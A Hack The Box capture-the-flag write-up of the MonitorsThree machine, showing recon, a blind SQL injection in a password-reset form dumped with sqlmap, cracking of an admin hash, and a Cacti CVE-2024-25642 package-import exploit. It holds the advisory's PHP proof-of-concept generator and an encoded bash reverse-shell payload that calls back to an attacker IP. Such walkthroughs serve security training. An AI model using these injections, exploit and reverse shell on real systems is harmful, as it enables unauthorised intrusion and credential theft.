---
title: HTB: MonitorsThree
url: https://0xdf.gitlab.io/2025/01/18/htb-monitorsthree.html
date: 2025-01-18T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-monitorsthree, hackthebox, nmap, ffuf, subdomain, feroxbuster, cacti, sqli, sqlmap, crackstation, cve-2024-25642, upload, webshell, credentials, duplicati, docker, sqlite, client-side-hashing, iptables, xsp, mono, htb-monitors, htb-monitorstwo
---

![MonitorsThree](/img/monitorsthree-cover.png)

MonitorsThree, like the first two Monitors boxes, starts with an instance of Cacti. Before turning to that, I’ll abuse an SQL injection in the password reset functionality of the main site, leaking credentials from the DB. I’ll use those to get access to Cacti, and from there exploit a file upload vulnerability such that I can run arbitrary PHP code, and get RCE. I’ll get another password from the Cacti DB and pivot to the next user. For root, I’ll exploit an instance of Duplicati. I’ll show three different ways to abuse this, first by backing up the host root directory to read the flag, then by writing to the host file system, and finally by getting a shell in the Duplicati container and accessing the host filesystem from a shared volume in there. In Beyond Root, I’ll dig into port 8084, which was filtered in the initial scan, and still not responsive with a shell.

## Box Info

| Name | [MonitorsThree](https://hackthebox.com/machines/monitorsthree)  [MonitorsThree](https://hackthebox.com/machines/monitorsthree) [Play on HackTheBox](https://hackthebox.com/machines/monitorsthree) |
| --- | --- |
| Release Date | [24 Aug 2024](https://twitter.com/hackthebox_eu/status/1826635487903134081) |
| Retire Date | 18 Jan 2025 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for MonitorsThree |
| Radar Graph | Radar chart for MonitorsThree |
| First Blood User | 00:12:23[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| First Blood Root | 00:47:55[celesian celesian](https://app.hackthebox.com/users/114435) |
| Creators | [ruycr4ft ruycr4ft](https://app.hackthebox.com/users/1253217)  [kavigihan kavigihan](https://app.hackthebox.com/users/389926) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80) as well as a filtered port (8084):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.30
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 17:33 EDT
Nmap scan report for 10.10.11.30
Host is up (0.025s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
8084/tcp filtered websnp

Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.30
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 17:35 EDT
Nmap scan report for 10.10.11.30
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.77 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu jammy 22.04. There’s a redirect on 80 to `monitorsthree.htb`.

### Subdomain Brute Force

Given the use of virtual host routing, I’ll use `ffuf` to brute force for any subdomains of `monitorsthree.htb` that respond differently than the default case:

```

oxdf@hacky$ ffuf -u http://10.10.11.30 -H "Host: FUZZ.monitorsthree.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.30
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt                    
 :: Header           : Host: FUZZ.monitorsthree.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]                           
:: Progress: [19966/19966] :: Job [1/1] :: 1709 req/sec :: Duration: [0:00:12] :: Errors: 0 ::

```

It quickly identifies `cacti.monitorsthree.htb`. I’ll add both to my local `/etc/hosts` file:

```
10.10.11.30 monitorsthree.htb cacti.monitorsthree.htb

```

### monitorsthree.htb - TCP 80

#### Site

The site is for a network management company:

![image-20240827174531129](/img/image-20240827174531129.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There is a sales email on the page, `sales@monitorsthree.htb`. All but one of the links lead to places on the page. The “Login” link goes to `/login.php`:

![image-20240827174903825](/img/image-20240827174903825.png)

The “Forgot password?” link leads to another form but on entering “0xdf”, it just reports failure:

![image-20240827175005057](/img/image-20240827175005057.png)

When I try “admin”, it shows success:

![image-20240827175033986](/img/image-20240827175033986.png)

This is a method to enumerate valid users. I won’t need it for this box, but it’s always worth checking.

#### Tech Stack

The HTTP response headers just show nginx:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 27 Aug 2024 21:42:21 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Length: 13560

```

The login page is PHP, and the main page also loads as `/index.php`, so it’s safe to say it’s a PHP site. The 404 page is the [default nginx page 404 page](/cheatsheets/404#nginx).

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP. I’m also include `--dont-extract-links` because there’s a lot of results, and I want it to focus on brute forcing from the root, not links in the page:

```

oxdf@hacky$ feroxbuster -u http://monitorsthree.htb -x php --dont-extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://monitorsthree.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://monitorsthree.htb/images => http://monitorsthree.htb/images/
301      GET        7l       12w      178c http://monitorsthree.htb/js => http://monitorsthree.htb/js/
200      GET      338l      982w    13560c http://monitorsthree.htb/
301      GET        7l       12w      178c http://monitorsthree.htb/admin => http://monitorsthree.htb/admin/
301      GET        7l       12w      178c http://monitorsthree.htb/css => http://monitorsthree.htb/css/
200      GET       96l      239w     4252c http://monitorsthree.htb/login.php
302      GET        0l        0w        0c http://monitorsthree.htb/admin/logout.php => http://monitorsthree.htb/login.php
301      GET        7l       12w      178c http://monitorsthree.htb/images/blog => http://monitorsthree.htb/images/blog/
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets => http://monitorsthree.htb/admin/assets/
302      GET        0l        0w        0c http://monitorsthree.htb/admin/users.php => http://monitorsthree.htb/login.php
200      GET        0l        0w        0c http://monitorsthree.htb/admin/db.php
301      GET        7l       12w      178c http://monitorsthree.htb/fonts => http://monitorsthree.htb/fonts/
301      GET        7l       12w      178c http://monitorsthree.htb/images/services => http://monitorsthree.htb/images/services/
200      GET      338l      982w    13560c http://monitorsthree.htb/index.php
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/images => http://monitorsthree.htb/admin/assets/images/
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/js => http://monitorsthree.htb/admin/assets/js/
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/css => http://monitorsthree.htb/admin/assets/css/
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/js/plugins => http://monitorsthree.htb/admin/assets/js/plugins/
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/swf => http://monitorsthree.htb/admin/assets/swf/
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/js/pages => http://monitorsthree.htb/admin/assets/js/pages/
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/js/core => http://monitorsthree.htb/admin/assets/js/core/
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/css/extras => http://monitorsthree.htb/admin/assets/css/extras/
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/css/icons => http://monitorsthree.htb/admin/assets/css/icons/
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/js/maps => http://monitorsthree.htb/admin/assets/js/maps/
200      GET       20l       36w      303c http://monitorsthree.htb/admin/footer.php
302      GET        0l        0w        0c http://monitorsthree.htb/admin/dashboard.php => http://monitorsthree.htb/login.php
302      GET        0l        0w        0c http://monitorsthree.htb/admin/customers.php => http://monitorsthree.htb/login.php
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/js/charts => http://monitorsthree.htb/admin/assets/js/charts/
302      GET        0l        0w        0c http://monitorsthree.htb/admin/invoices.php => http://monitorsthree.htb/login.php
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/images/flags => http://monitorsthree.htb/admin/assets/images/flags/
302      GET        0l        0w        0c http://monitorsthree.htb/admin/tasks.php => http://monitorsthree.htb/login.php
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/images/ui => http://monitorsthree.htb/admin/assets/images/ui/
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/images/backgrounds => http://monitorsthree.htb/admin/assets/images/backgrounds/
200      GET      306l      960w    11647c http://monitorsthree.htb/css/css2
301      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/locales => http://monitorsthree.htb/admin/assets/locales/
200      GET       85l      212w     3030c http://monitorsthree.htb/forgot_password.php
200      GET      144l      370w     6248c http://monitorsthree.htb/admin/navbar.php
302      GET        0l        0w        0c http://monitorsthree.htb/admin/changelog.php => http://monitorsthree.htb/login.php
[####################] - 74s   420000/420000  0s      found:38      errors:0
[####################] - 70s    30000/30000   426/s   http://monitorsthree.htb/
[####################] - 71s    30000/30000   424/s   http://monitorsthree.htb/images/
[####################] - 71s    30000/30000   425/s   http://monitorsthree.htb/js/
[####################] - 70s    30000/30000   427/s   http://monitorsthree.htb/admin/
[####################] - 71s    30000/30000   425/s   http://monitorsthree.htb/css/
[####################] - 70s    30000/30000   428/s   http://monitorsthree.htb/images/blog/
[####################] - 71s    30000/30000   425/s   http://monitorsthree.htb/admin/assets/
[####################] - 70s    30000/30000   427/s   http://monitorsthree.htb/fonts/
[####################] - 70s    30000/30000   427/s   http://monitorsthree.htb/images/services/
[####################] - 70s    30000/30000   426/s   http://monitorsthree.htb/admin/assets/images/
[####################] - 70s    30000/30000   428/s   http://monitorsthree.htb/admin/assets/js/
[####################] - 70s    30000/30000   428/s   http://monitorsthree.htb/admin/assets/css/
[####################] - 70s    30000/30000   428/s   http://monitorsthree.htb/admin/assets/swf/
[####################] - 69s    30000/30000   438/s   http://monitorsthree.htb/admin/assets/locales/ 

```

The only really interesting part is `/admin` and files in it. Everything in `/admin` seems to redirect to `/login.php`.

### cacti.monitorsthree.htb

#### Site

This domain provides a login form for an instance of Cacti:

![image-20240827175907054](/img/image-20240827175907054.png)

Without creds there’s not much else here.

#### Tech Stack

The HTTP response headers don’t show anything interesting, just nginx. The site is clearly running the PHP-based monitoring application [Cacti](https://www.cacti.net/), just like [Monitors](/2021/10/09/htb-monitors.html#) and [MonitorsTwo](/2023/09/02/htb-monitorstwo.html#). This time it’s version 1.2.26. I don’t find any interesting pre-authentication CVEs against this version.

I will pass on brute forcing paths on the site for now, as the [source](https://github.com/Cacti/cacti) is on GitHub.

## Shell as www-data

### Recover Admin Password

#### Identify SQLI Injection

On the main site, I’ll check each of the user inputs for SQL injection. The login form seems fine, but when I enter `0xdf'` as the username for the password recovery, it returns an error:

![image-20240827180641541](/img/image-20240827180641541.png)

#### Attempt at Union

I can try to do a UNION injection by guessing at the number of columns, starting with `' union select 1;-- -`:

![image-20240827181011667](/img/image-20240827181011667.png)

I’ll add numbers until I get to `' union select 1,2,3,4,5,6,7,8,9;-- -`, it works, but it doesn’t return any data to the user:

![image-20240827180939721](/img/image-20240827180939721.png)

I’ll need to use a blind technique.

#### sqlmap

At this point it’s easier to move to `sqlmap` to automate the injection. I’ll find a request in Burp with no injection and right click, “Copy to file”:

![image-20240827181423345](/img/image-20240827181423345.png)

Now I’ll pass that file to `sqlmap` and let it find the injection:

```

oxdf@hacky$ sqlmap -r reset.request --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:12:47 /2024-08-27/

[18:12:47] [INFO] parsing HTTP request from 'reset.request'
[18:12:47] [INFO] testing connection to the target URL
got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[18:12:47] [INFO] testing if the target URL content is stable
[18:12:47] [WARNING] POST parameter 'username' does not appear to be dynamic
[18:12:48] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[18:12:48] [INFO] testing for SQL injection on POST parameter 'username'
[18:12:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:12:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:12:49] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:12:50] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:12:51] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:12:52] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:12:53] [INFO] testing 'Generic inline queries'
[18:12:53] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:12:53] [WARNING] time-based comparison requires larger statistical model, please wait. (done)
[18:12:54] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:12:55] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:12:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:13:46] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[18:13:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:13:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:13:50] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=0xdf' AND (SELECT 2832 FROM (SELECT(SLEEP(5)))dybM) AND 'OxCQ'='OxCQ
---
[18:15:07] [INFO] the back-end DBMS is MySQL
[18:15:07] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:15:32] [INFO] fetched data logged to text files under '/home/oxdf/.local/share/sqlmap/output/monitorsthree.htb'

[*] ending @ 18:15:32 /2024-08-27/

```

Anytime I get back that the only option is time-based blind, I’ll want to take a deeper look to see if there are other options. Based on my playing around a bit, this should be vulnerable to a boolean-based blind attack, which will be much faster than time-based.

To test this, I’ll use `--flush-session` to start clean, specify the DB as MySQL (based on what I found above), and the `--technique=B` for boolean. I’ll max the level and risk. I also won’t run with `--batch`, as that messes this up. On first starting, it asks two questions:

```

got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n]
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n]

```

I need the first one to be Y, but the second N. If the second is Y, then it sends the same POST request back to `/forgot_password.php`, which just returns another 302 with no way to evaluate the response.

It finds the injection much more quickly:

```

oxdf@hacky$ sqlmap -r reset.request --level 5 --risk 3 --dbms=mysql --technique=B --flush-session 
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.4#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:34:58 /2024-08-28/

[13:34:58] [INFO] parsing HTTP request from 'reset.request'
[13:34:58] [INFO] flushing session file
[13:34:58] [INFO] testing connection to the target URL
got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
[13:35:00] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:35:01] [INFO] testing if the target URL content is stable
[13:35:01] [WARNING] POST parameter 'username' does not appear to be dynamic
[13:35:01] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
[13:35:01] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[13:35:01] [INFO] testing for SQL injection on POST parameter 'username'
[13:35:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:35:02] [WARNING] reflective value(s) found and filtering out
[13:35:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[13:35:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[13:35:51] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="                                               Unable to process request, try again!")
[13:35:51] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[13:35:51] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 222 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=0xdf' OR NOT 5761=5761-- McSu
---
[13:35:58] [INFO] testing MySQL
[13:35:59] [INFO] confirming MySQL
[13:35:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[13:36:00] [INFO] fetched data logged to text files under '/home/oxdf/.local/share/sqlmap/output/monitorsthree.htb'

[*] ending @ 13:36:00 /2024-08-28/

```

#### DB Enumeration

I’ll get the databases. While increasing the threads *should* be safe with a boolean-blind, I had issues every time I tried it, so I’ll go without:

```

oxdf@hacky$ sqlmap -r reset.request --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:36:10 /2024-08-28/

[13:36:10] [INFO] parsing HTTP request from 'reset.request'
[13:36:10] [INFO] resuming back-end DBMS 'mysql' 
[13:36:10] [INFO] testing connection to the target URL
got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=0xdf' OR NOT 5761=5761-- McSu
---
[13:36:11] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 (MariaDB fork)
[13:36:11] [INFO] fetching database names
[13:36:11] [INFO] fetching number of databases
[13:36:11] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[13:36:11] [INFO] retrieved: 2
[13:36:13] [INFO] retrieved: information_schema
[13:36:42] [INFO] retrieved: monitorsthree_db
available databases [2]:
[*] information_schema
[*] monitorsthree_db

[13:37:08] [INFO] fetched data logged to text files under '/home/oxdf/.local/share/sqlmap/output/monitorsthree.htb'

[*] ending @ 13:37:08 /2024-08-28/

```

`monitorsthree_db` is the interesting one. I’ll get the tables (continuing to enter Y then N at the initial requests):

```

oxdf@hacky$ sqlmap -r reset.request -D monitorsthree_db --tables
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:39:36 /2024-08-28/

[13:39:36] [INFO] parsing HTTP request from 'reset.request'
[13:39:36] [INFO] resuming back-end DBMS 'mysql'
[13:39:36] [INFO] testing connection to the target URL
got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] n
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=0xdf' OR NOT 5761=5761-- McSu
---
[13:39:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 (MariaDB fork)
[13:39:39] [INFO] fetching tables for database: 'monitorsthree_db'
[13:39:39] [INFO] fetching number of tables for database 'monitorsthree_db'
[13:39:39] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[13:39:39] [INFO] retrieved: 6
[13:39:41] [INFO] retrieved: invoices
[13:39:54] [INFO] retrieved: customers
[13:40:09] [INFO] retrieved: changelog
[13:40:22] [INFO] retrieved: tasks
[13:40:31] [INFO] retrieved: invoice_tasks
[13:40:53] [INFO] retrieved: users
Database: monitorsthree_db
[6 tables]
+---------------+
| changelog     |
| customers     |
| invoice_tasks |
| invoices      |
| tasks         |
| users         |
+---------------+

[13:41:01] [INFO] fetched data logged to text files under '/home/oxdf/.local/share/sqlmap/output/monitorsthree.htb'

[*] ending @ 13:41:01 /2024-08-28/

```

There are six tables. I’ll dump the user’s table:

```

oxdf@hacky$ sqlmap -r reset.request -D monitorsthree_db -T users --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

...[snip]...
Database: monitorsthree_db
Table: users
[4 entries]
+----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
| id | dob        | email                       | name              | salary    | password                         | username  | position              | start_date |
+----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
| 2  | 1978-04-25 | admin@monitorsthree.htb     | Marcus Higgins    | 320800.00 | 31a181c8372e3afc59dab863430610e8 | admin     | Super User            | 2021-01-12 |
| 5  | 1985-02-15 | mwatson@monitorsthree.htb   | Michael Watson    | 75000.00  | c585d01f2eb3e6e1073e92023088a3dd | mwatson   | Website Administrator | 2021-05-10 |
| 6  | 1990-07-30 | janderson@monitorsthree.htb | Jennifer Anderson | 68000.00  | 1e68b6eb86b45f6d92f8f292428f77ac | janderson | Network Engineer      | 2021-06-20 |
| 7  | 1982-11-23 | dthompson@monitorsthree.htb | David Thompson    | 83000.00  | 633b683cc128fe244b00f176c8a950f5 | dthompson | Database Manager      | 2022-09-15 |
+----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
...[snip]...

```

There are four users with hashes.

#### Crack Password

I’ll take the hashes to [CrackStation](https://crackstation.net/), and the first one cracks:

![image-20240828084704767](/img/image-20240828084704767.png)

The password “greencacti2001” works for `admin@monitorsthree.htb` / Marcus Higgins.

#### Main Site

These creds work to log into the main page at `monitorsthree.htb`, giving a dashboard:

![image-20240828084939957](/img/image-20240828084939957.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There’s a bunch of pages with a bunch of filterable tables of tasks, invoices, users, etc. Everything is very static, and there’s nothing that takes user input.

### Exploit Cacti

#### Authentication

The same creds, admin / “greencacti2001”, work to log into `cacti.monitorsthree.htb`:

![image-20240828085123448](/img/image-20240828085123448.png)

Even as the admin user, there’s not too much interesting in the admin panel.

#### Identify CVE-2024-25642

Searching for vulnerabilities in this version of Cacti returns a bunch of references to CVE-2024-25642:

![image-20240827180401410](/img/image-20240827180401410.png)

#### CVE-2024-25642 Background

The [advisory for CVE-2024-25642](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) say it is:

> An arbitrary file write vulnerability, exploitable through the “Package Import” feature, allows authenticated users having the “Import Templates” permission to execute arbitrary PHP code on the web server ([RCE](https://en.wikipedia.org/wiki/Arbitrary_code_execution)).

The advisory also has a nice POC section with a PHP script to generate a payload:

```

<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = "<?php phpinfo(); ?>";
$keypair = openssl_pkey_new(); 
$public_key = openssl_pkey_get_details($keypair)["key"]; 
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>

```

It takes the following steps:
- Starts with a payload, in this case a page that runs `phpinfo()` as a POC.
- It generates a keypair and gets a signature for the data.
- It fills in the XML template with the payload, it’s signature, and it’s public key.
- It writes that XML to a file, and then compresses it to `test.xml.gz`, removing the first file.

That payload can be uploaded into Cacti and will drop the payload.

#### Shell

I’ll take the PHP and modify it slightly, replacing the `phpinfo` with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) and changing the some names:

![image-20240828090538020](/img/image-20240828090538020.png)

I’ll run this with PHP:

```

oxdf@hacky$ php cve-2024-25642.php

```

It generates a file, `revshell.xml.gz` (the contents of which can be viewed with `zcat`):

```

oxdf@hacky$ ls revshell.xml.gz 
revshell.xml.gz
oxdf@hacky$ zcat revshell.xml.gz 
<xml>
   <files>
       <file>
           <name>resource/0xdf.php</name>
<data>PD9waHAgc3lzdGVtKCdiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE4LzQ0MyAwPiYxIicpOyA/Pg==</data>
<filesignature>dPtx+jCqbTht1ZbW1vD5yZnEwasfX5D1XVCY+oQ6/44hffOyRgw2c7EsFaa+qBXk9A5H/Iq9EoNPpExCAcd/yF2ADpl6XpTOgxqsBbMHv6Bfvz/8SLiTdnxdGHo8BxwxU4DMoCryilGNPoQODjxL0mRnfTo1Rmkk8diEyA6ePrRc7GnUV3wkyN+az0SNVqcEx9rYVnj8RxBDY28rKPZEPDyDkW0YaVyZAeEZVi3bI2rqvUw782lhqL/XqHuOFIad6faNkgwuL2pcjc4f3nvEHWwyt/mNjqWeLcgqGV2jJ5QsKYlf4Zpqvjbk1a61EqquFLkUil0xxf3y+fu+OKrmcg==</filesignature>
       </file>
   </files>
